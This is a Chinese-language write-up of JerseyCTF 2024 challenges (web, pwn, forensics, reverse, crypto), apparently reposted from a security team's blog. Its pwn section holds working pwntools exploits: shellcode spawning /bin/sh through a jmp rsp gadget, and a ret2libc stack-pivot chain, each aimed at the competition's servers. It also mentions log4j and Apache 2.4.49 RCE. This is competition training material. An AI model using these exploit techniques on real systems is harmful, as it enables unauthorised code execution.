# JerseyCTF Writeup

> 原文: https://www.ctfiot.com/169617.html
> ID: 169617

点击蓝字

关注我们

声明

本文作者：ctf战队本文字数：约6614字

阅读时长：约15分钟

附件/链接：点击查看原文下载

本文属于【狼组安全社区】原创奖励计划，未经许可禁止转载

❝

Jerseyctf March 23-24th, 2024 ctf.jerseyctf.com

WEB

Consent-N-Consent

在源代码找到了网页 http://44.210.135.76/sites/Nothing2.html输入12 获得 flag

logging4joy

log4j 的poc 会直接获得flag

mmmmm-rbs

flag 在设置的 jwt 中

require-all-denied

Apache/2.4.49 (Debian) rce

Pwn

searching-through-vines

直接sh，再读flag

MathTest

回答三个问题并满足答案和等于最初输入的name即可获得flag

1. ans1>=0 && ans1*0x9000<=0 (ans1为long)
2. ans2<0 && ans2*0xdeadbeef != 0 (ans2为long)
3. ans3*'z' == 'A' (ans3为char)
4. ans1+ans2+ans3 == name

# print(2**63/0x9000)

# for i in range(256):
#       if (ord('O')*i)&0xff == ord('A'):
#             print(chr(i))

from pwn import *

io = remote("18.207.140.246",9001)

ans = ['250199979298361','-1','o']
name = int(ans[0]) + int(ans[1]) + ord(ans[2])

io.sendlineafter(b":n",p64(name))
io.sendlineafter(b"xn",ans[0])
io.sendlineafter(b"yn",ans[1])
io.sendlineafter(b"z?n","n"+ans[2])

io.interactive()

RunningOnPrayers

vuln函数中有溢出有个gift，虚假的gift，有jmp rsp的gadget，写shellcode到栈上再jmp rsp，在rsp位置写jmp $-0x30，控制rip到shellcode首地址即可

from pwn import *

io = remote("18.212.207.74",9001)
shellcode_x64 = b"x48x31xf6x56x48xbfx2fx62x69x6ex2fx2fx73x68x57x54x5fx6ax3bx58x99x0fx05"
jmp_rsp = 0x401231
p = shellcode_x64.ljust(0x20+8,b"A") + p64(jmp_rsp) + asm("jmp $-0x30")
io.sendlineafter(b"with it",p)
io.interactive()

StageLeft

和上一道一模一样，就jmp rsp位置换了和输入长度限制了，上一题exp一样通

from pwn import *

io = remote("3.91.151.73",9001)
shellcode_x64 = b"x48x31xf6x56x48xbfx2fx62x69x6ex2fx2fx73x68x57x54x5fx6ax3bx58x99x0fx05"
jmp_rsp = 0x401238
p = shellcode_x64.ljust(0x20+8,b"A") + p64(jmp_rsp) + asm("jmp $-0x30")
io.sendlineafter(b"...",p)
io.interactive()

Postage

ret2libc+栈迁移，泄露libc，再把ogg写到bss，迁移劫持rip到ogg

from pwn import *

io = remote("100.25.130.96",9001) 
elf = ELF("./pwn")
io.recvuntil(b"Welcome to  ")
base = int(io.recv(14),16) - 0x1359 
rdi_rbp_ret = base + 0x1356
puts_plt = base + elf.plt['puts']
gets_got = base + elf.got['gets']
gets_plt = base + elf.plt['gets']
bss = base + 0x4100
rsp_ret = base + 0x1446

io.sendlineafter(b"deliveredn",b"1")
io.sendline(b"1")
p = b"A"*(0x30+8) + p64(rdi_rbp_ret) + p64(gets_got) + b"A"*8 + p64(puts_plt) 
p += p64(rdi_rbp_ret) + p64(bss+0x8) + p64(bss) +p64(gets_plt)
p += p64(rsp_ret) + p64(bss+0x8)
io.sendlineafter(b"questions?n",p)

gets = u64(io.recvuntil(b"x7f")[-6:].ljust(8,b"x00"))

libc = ELF("./libc.so.6")
libc_base = gets - libc.sym['gets']
print("[+]libc_base:",hex(libc_base))
p = p64(libc_base+0xebc81)
io.sendline(p)

io.interactive()

Misc

internal-tensions

在 https://web.archive.org/web/20240000000000*/https://jerseyctf.com/ 寻找网页历史快照 注释中发现 flag

Forensics

substitute-detail-torrent

010打开文件就有 或者寻找注释 strings

groovy

音频文件 打开频谱图就能看到

data-divergence-discovery

比较文件 看差异部分

the-droid-youre-looking-for

审计apk找到代码中的内容 或者直接安装apk代码指向activity_main

open-notes
f4c24f3779cbac46350eb5f86234ce5.png

living-on-the-edge
c9bcc2351de7e545f94c74096de8116.png

Reverse

PasswordManager

flag = [0x4f,0x46,0x51,0x43,0x5e,0x52,0x4d,0x16,0x57,0x16,0x56,0x7a,0x48,0x65,0x5c,0x65,0x1a,0x58]
print(''.join(chr(i^0x25) for i in flag))
#jctf{wh3r3s_m@y@?}

humble-beginnings

jctf{}框起来就行

the-heist-1

ida打开，主要对输入的字符串做如下运算，左移、异或等操作，ROL1代表左移，ROR1代表右移直接做他的逆运算做不出来

 for(int i=0;i<strlen(a);i++)
 {
  a[i]=a[i]^0x55;
  a[i]=a[i]>>4;
  a[i]=~a[i];
  a[i]=a[i]-0x60;
  printf("%c",a[i]);
 }

但是他每个字符加密的结果不因为位置而改变，并且没有限制输入的字符串的长度，所以直接模式匹配，输入

!#$&()*+,-.0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_abcdefghijklmnopqrstuvwxyz{|}~

得到加密结果

0xB2, 0x92, 0xE2, 0xC2, 0x22, 0x32, 0x02, 0x12, 0x62, 0x72, 
  0x42, 0xA3, 0xB3, 0x83, 0x93, 0xE3, 0xF3, 0xC3, 0xD3, 0x23, 
  0x33, 0x03, 0x13, 0x63, 0x73, 0x43, 0x53, 0xA0, 0xB0, 0x80, 
  0x90, 0xE0, 0xF0, 0xC0, 0xD0, 0x20, 0x30, 0x00, 0x10, 0x60, 
  0x70, 0x40, 0x50, 0xA1, 0xB1, 0x81, 0x91, 0xE1, 0xF1, 0xC1, 
  0xD1, 0x21, 0x31, 0x01, 0x11, 0x71, 0x41, 0x51, 0xB6, 0x86, 
  0x96, 0xE6, 0xF6, 0xC6, 0xD6, 0x26, 0x36, 0x06, 0x16, 0x66, 
  0x76, 0x46, 0x56, 0xA7, 0xB7, 0x87, 0x97, 0xE7, 0xF7, 0xC7, 
  0xD7, 0x27, 0x37, 0x07, 0x17, 0x67, 0x77, 0x47, 0x0C

写脚本匹配

#include<stdio.h>
#include<string.h>
int main()
{
  char enc[130]="!#$&()*+,-.0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_abcdefghijklmnopqrstuvwxyz{|}~";
  char flag[130]={0xB2, 0x92, 0xE2, 0xC2, 0x22, 0x32, 0x02, 0x12, 0x62, 0x72, 
  0x42, 0xA3, 0xB3, 0x83, 0x93, 0xE3, 0xF3, 0xC3, 0xD3, 0x23, 
  0x33, 0x03, 0x13, 0x63, 0x73, 0x43, 0x53, 0xA0, 0xB0, 0x80, 
  0x90, 0xE0, 0xF0, 0xC0, 0xD0, 0x20, 0x30, 0x00, 0x10, 0x60, 
  0x70, 0x40, 0x50, 0xA1, 0xB1, 0x81, 0x91, 0xE1, 0xF1, 0xC1, 
  0xD1, 0x21, 0x31, 0x01, 0x11, 0x71, 0x41, 0x51, 0xB6, 0x86, 
  0x96, 0xE6, 0xF6, 0xC6, 0xD6, 0x26, 0x36, 0x06, 0x16, 0x66, 
  0x76, 0x46, 0x56, 0xA7, 0xB7, 0x87, 0x97, 0xE7, 0xF7, 0xC7, 
  0xD7, 0x27, 0x37, 0x07, 0x17, 0x67, 0x77, 0x47, 0x0C};
  for(int i=0;i<12;i++)
  {
   for(int j=0;j<130;j++)
   {
    if(a[i]==flag[j])
   {
    printf("%d,",enc[j]);
    break;
   }
   }
   
  }
 return 0;

得到

flag{62881624049}

Crypto

Attn-Agents
image.png

adveRSAry

解rsa即可

n=17442167786986766235508280058577595032418346865356384314588411668992021895600868350218184780194110761373508781422091305225542546224481473153630944998702906444849200685696584928947432984107850030283893610570516934680203526010120917342029004968274580529974129621496912684782372265785658930593603142665659506699243072516516137946842936290278268697077045538529685782129547539858559544839323949738223228390505139321940994534861711115670206937761214670974876911762247915864144972967596892171732288160028157304811773245287483562194767483306442774467144670636599118796333785601743172345142463479403997891622078353449239584139
e=65537
q=5287605531078312817093699647404386356924677771068464930426961333492561825516192878006123785244929191711528060728030853752820877049331817571778425287562926236019883991325417165497210118975730500175398583896121555159133806789573964069837032915266548561424490397811232957782739002112133875199
c=b'wnxa3xcbxc2xe1pjxx867x1cnxc3x9dBx02?xb2x99x8axb8-9;Cxa4xb8xfcxc3xcaxfex8ex1exa1xf5xec[Rn&xbbx8bnxafx83^[Pxf9x8cxd5x95~xa7xcb xb0x85Vfdux9dxf5xe4mXex95tx96Vxe2xcauxe1x90x8cA/xb1xf3,xa8x04xb9xcfx8fPXfx0ffgx8e>Cxc7x12xa3Fx04x1atxc2exdbxc1xf1iJx9e"+x0bx9dxc2{xe9x1bxbfN^xb1x14xc3xbfvxebx90xcdxc7oixccx8fKQxdevyx86$x88xcaxd6xa9xe3~xd1g=ryxf3xcbx85xb7xfaxe1xe0Tx8bxcfx18xa0xc3x15x15Tx82xb1xa16xbcFx06xebx9dxb5xa4x80$x19fx91xb5x8axe6xe0xf6Iux84x87xc6xecexf5xfcxd5Dxd6Mxe4knUx06xedxa3xdf^Vxc06hxaex9cx89x96Vxbe@xf8mxe0$x11x9dxd9xe2xdbx8anxaa}xce:xa8Cx93xb6O6x07xafxfbx05xb7}xadxdfxd5%'
from Crypto.Util.number import *
import gmpy2
p=n//q
c=bytes_to_long(c)
d=gmpy2.invert(e,(q-1)*(p-1))
m=pow(c,d,n)
print(long_to_bytes(m))
#jctf{HAHAHA I knew you would intercept this transmission. You may have won this round, but there are many more challenges for me to best you at}

OSINT

coasting-underground
image.png

beyond-the-packet

CTF战队正在招新

match@wgpsec.org

作者

CTF战队

ctf.wgpsec.org

扫描关注公众号回复加群

和师傅们一起讨论研究~

长

按

关

注

WgpSec狼组安全团队

微信号：wgpsec

Twitter：@wgpsec


```
1. ans1>=0 && ans1*0x9000<=0 (ans1为long)
2. ans2<0 && ans2*0xdeadbeef != 0 (ans2为long)
3. ans3*'z' == 'A' (ans3为char)
4. ans1+ans2+ans3 == name
```



```
# print(2**63/0x9000)

# for i in range(256):
#       if (ord('O')*i)&0xff == ord('A'):
#             print(chr(i))

from pwn import *

io = remote("18.207.140.246",9001)

ans = ['250199979298361','-1','o']
name = int(ans[0]) + int(ans[1]) + ord(ans[2])

io.sendlineafter(b":n",p64(name))
io.sendlineafter(b"xn",ans[0])
io.sendlineafter(b"yn",ans[1])
io.sendlineafter(b"z?n","n"+ans[2])

io.interactive()
```



```
from pwn import *

io = remote("18.212.207.74",9001)
shellcode_x64 = b"x48x31xf6x56x48xbfx2fx62x69x6ex2fx2fx73x68x57x54x5fx6ax3bx58x99x0fx05"
jmp_rsp = 0x401231
p = shellcode_x64.ljust(0x20+8,b"A") + p64(jmp_rsp) + asm("jmp $-0x30")
io.sendlineafter(b"with it",p)
io.interactive()
```



```
from pwn import *

io = remote("3.91.151.73",9001)
shellcode_x64 = b"x48x31xf6x56x48xbfx2fx62x69x6ex2fx2fx73x68x57x54x5fx6ax3bx58x99x0fx05"
jmp_rsp = 0x401238
p = shellcode_x64.ljust(0x20+8,b"A") + p64(jmp_rsp) + asm("jmp $-0x30")
io.sendlineafter(b"...",p)
io.interactive()
```



```
from pwn import *

io = remote("100.25.130.96",9001) 
elf = ELF("./pwn")
io.recvuntil(b"Welcome to  ")
base = int(io.recv(14),16) - 0x1359 
rdi_rbp_ret = base + 0x1356
puts_plt = base + elf.plt['puts']
gets_got = base + elf.got['gets']
gets_plt = base + elf.plt['gets']
bss = base + 0x4100
rsp_ret = base + 0x1446

io.sendlineafter(b"deliveredn",b"1")
io.sendline(b"1")
p = b"A"*(0x30+8) + p64(rdi_rbp_ret) + p64(gets_got) + b"A"*8 + p64(puts_plt) 
p += p64(rdi_rbp_ret) + p64(bss+0x8) + p64(bss) +p64(gets_plt)
p += p64(rsp_ret) + p64(bss+0x8)
io.sendlineafter(b"questions?n",p)

gets = u64(io.recvuntil(b"x7f")[-6:].ljust(8,b"x00"))

libc = ELF("./libc.so.6")
libc_base = gets - libc.sym['gets']
print("[+]libc_base:",hex(libc_base))
p = p64(libc_base+0xebc81)
io.sendline(p)

io.interactive()
```



```
flag = [0x4f,0x46,0x51,0x43,0x5e,0x52,0x4d,0x16,0x57,0x16,0x56,0x7a,0x48,0x65,0x5c,0x65,0x1a,0x58]
print(''.join(chr(i^0x25) for i in flag))
#jctf{wh3r3s_m@y@?}
```



```
for(int i=0;i<strlen(a);i++)
 {
  a[i]=a[i]^0x55;
  a[i]=a[i]>>4;
  a[i]=~a[i];
  a[i]=a[i]-0x60;
  printf("%c",a[i]);
 }
```



```
!#$&()*+,-.0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_abcdefghijklmnopqrstuvwxyz{|}~
```



```
0xB2, 0x92, 0xE2, 0xC2, 0x22, 0x32, 0x02, 0x12, 0x62, 0x72, 
  0x42, 0xA3, 0xB3, 0x83, 0x93, 0xE3, 0xF3, 0xC3, 0xD3, 0x23, 
  0x33, 0x03, 0x13, 0x63, 0x73, 0x43, 0x53, 0xA0, 0xB0, 0x80, 
  0x90, 0xE0, 0xF0, 0xC0, 0xD0, 0x20, 0x30, 0x00, 0x10, 0x60, 
  0x70, 0x40, 0x50, 0xA1, 0xB1, 0x81, 0x91, 0xE1, 0xF1, 0xC1, 
  0xD1, 0x21, 0x31, 0x01, 0x11, 0x71, 0x41, 0x51, 0xB6, 0x86, 
  0x96, 0xE6, 0xF6, 0xC6, 0xD6, 0x26, 0x36, 0x06, 0x16, 0x66, 
  0x76, 0x46, 0x56, 0xA7, 0xB7, 0x87, 0x97, 0xE7, 0xF7, 0xC7, 
  0xD7, 0x27, 0x37, 0x07, 0x17, 0x67, 0x77, 0x47, 0x0C
```



```
#include<stdio.h>
#include<string.h>
int main()
{
  char enc[130]="!#$&()*+,-.0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_abcdefghijklmnopqrstuvwxyz{|}~";
  char flag[130]={0xB2, 0x92, 0xE2, 0xC2, 0x22, 0x32, 0x02, 0x12, 0x62, 0x72, 
  0x42, 0xA3, 0xB3, 0x83, 0x93, 0xE3, 0xF3, 0xC3, 0xD3, 0x23, 
  0x33, 0x03, 0x13, 0x63, 0x73, 0x43, 0x53, 0xA0, 0xB0, 0x80, 
  0x90, 0xE0, 0xF0, 0xC0, 0xD0, 0x20, 0x30, 0x00, 0x10, 0x60, 
  0x70, 0x40, 0x50, 0xA1, 0xB1, 0x81, 0x91, 0xE1, 0xF1, 0xC1, 
  0xD1, 0x21, 0x31, 0x01, 0x11, 0x71, 0x41, 0x51, 0xB6, 0x86, 
  0x96, 0xE6, 0xF6, 0xC6, 0xD6, 0x26, 0x36, 0x06, 0x16, 0x66, 
  0x76, 0x46, 0x56, 0xA7, 0xB7, 0x87, 0x97, 0xE7, 0xF7, 0xC7, 
  0xD7, 0x27, 0x37, 0x07, 0x17, 0x67, 0x77, 0x47, 0x0C};
  for(int i=0;i<12;i++)
  {
   for(int j=0;j<130;j++)
   {
    if(a[i]==flag[j])
   {
    printf("%d,",enc[j]);
    break;
   }
   }
   
  }
 return 0;
```



```
flag{62881624049}
```



```
n=17442167786986766235508280058577595032418346865356384314588411668992021895600868350218184780194110761373508781422091305225542546224481473153630944998702906444849200685696584928947432984107850030283893610570516934680203526010120917342029004968274580529974129621496912684782372265785658930593603142665659506699243072516516137946842936290278268697077045538529685782129547539858559544839323949738223228390505139321940994534861711115670206937761214670974876911762247915864144972967596892171732288160028157304811773245287483562194767483306442774467144670636599118796333785601743172345142463479403997891622078353449239584139
e=65537
q=5287605531078312817093699647404386356924677771068464930426961333492561825516192878006123785244929191711528060728030853752820877049331817571778425287562926236019883991325417165497210118975730500175398583896121555159133806789573964069837032915266548561424490397811232957782739002112133875199
c=b'wnxa3xcbxc2xe1pjxx867x1cnxc3x9dBx02?xb2x99x8axb8-9;Cxa4xb8xfcxc3xcaxfex8ex1exa1xf5xec[Rn&xbbx8bnxafx83^[Pxf9x8cxd5x95~xa7xcb xb0x85Vfdux9dxf5xe4mXex95tx96Vxe2xcauxe1x90x8cA/xb1xf3,xa8x04xb9xcfx8fPXfx0ffgx8e>Cxc7x12xa3Fx04x1atxc2exdbxc1xf1iJx9e"+x0bx9dxc2{xe9x1bxbfN^xb1x14xc3xbfvxebx90xcdxc7oixccx8fKQxdevyx86$x88xcaxd6xa9xe3~xd1g=ryxf3xcbx85xb7xfaxe1xe0Tx8bxcfx18xa0xc3x15x15Tx82xb1xa16xbcFx06xebx9dxb5xa4x80$x19fx91xb5x8axe6xe0xf6Iux84x87xc6xecexf5xfcxd5Dxd6Mxe4knUx06xedxa3xdf^Vxc06hxaex9cx89x96Vxbe@xf8mxe0$x11x9dxd9xe2xdbx8anxaa}xce:xa8Cx93xb6O6x07xafxfbx05xb7}xadxdfxd5%'
from Crypto.Util.number import *
import gmpy2
p=n//q
c=bytes_to_long(c)
d=gmpy2.invert(e,(q-1)*(p-1))
m=pow(c,d,n)
print(long_to_bytes(m))
#jctf{HAHAHA I knew you would intercept this transmission. You may have won this round, but there are many more challenges for me to best you at}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/9-1711425819.gif)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/8-1711425819.jpeg)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/5-1711425820.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/9-1711425821.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/6-1711425821.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/4-1711425822.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/0-1711425823.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/4-1711425824.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/9-1711425825.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/03/7-1711425826.png)